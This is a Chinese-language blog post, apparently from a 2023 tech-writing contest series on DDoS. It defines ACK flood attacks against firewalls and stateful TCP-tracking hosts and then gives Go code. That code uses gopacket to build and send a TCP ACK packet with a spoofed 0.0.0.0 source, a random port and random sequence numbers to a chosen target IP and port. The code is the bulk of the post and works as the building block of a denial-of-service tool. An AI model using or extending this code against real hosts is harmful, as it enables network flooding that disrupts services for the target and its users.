---
author: Sunny Tsai
title: "[Day 13] 閑的沒事就寫封包 - ACK Flood之建立封包"
date: 2023-09-26
math: true
tags: [
    "cloud",
    "ack",
    "ack flood"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-DDOS：閑的沒事就開始DDOS"]
---
# ACK Flood
ACK(Acknowledgement) Flood指的是攻擊者大量發送ACK封包，目標主機需要消耗資源在已建立的連接列表中查找與這些偽造的ACK封包對應的TCP連接。由於這些連接並不存在，導致目標主機花費大量的資源在處理這些無效的封包。

目標：主要針對防火牆，ACK Flood攻擊主要針對那些維護與追蹤TCP連接的狀態的機器。


sysAck.go
先用gopacket
```
package packet

import (
	"fmt"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func Ack(targetIP string, targetPort int) error {
	random := rand.New(rand.NewSource(time.Now().UnixNano()))
	srcIP := net.ParseIP("0.0.0.0").To4()
	srcPort := random.Intn(65535)
	dstIP := net.ParseIP(targetIP).To4()
	dstPort := targetPort

	// Open up a packet handle for packet writes.
	handle, err := pcap.OpenLive("bridge100", 1024, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("Failed to open device: %v", err)
	}
	defer handle.Close()

	// Ethernet layer
	eth := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		DstMAC:       net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
		EthernetType: layers.EthernetTypeIPv4,
	}

	// IP layer
	ip := &layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dstIP,
		Version:  4,
		TTL:      64,
		Protocol: layers.IPProtocolTCP,
	}

	// TCP layer
	tcp := &layers.TCP{
		SrcPort: layers.TCPPort(srcPort),
		DstPort: layers.TCPPort(dstPort),
		ACK:     true,
		Seq:     uint32(rand.Int31()),
		Ack:     uint32(rand.Int31()),
		Window:  14600,
	}
	tcp.SetNetworkLayerForChecksum(ip)

	// Serialize the packet
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	err = gopacket.SerializeLayers(buf, opts, eth, ip, tcp)
	if err != nil {
		return fmt.Errorf("Failed to serialize packet: %v", err)
	}

	// Send the packet
	err = handle.WritePacketData(buf.Bytes())
	if err != nil {
		return fmt.Errorf("Failed to write packet: %v", err)
	}

	return nil
}
```
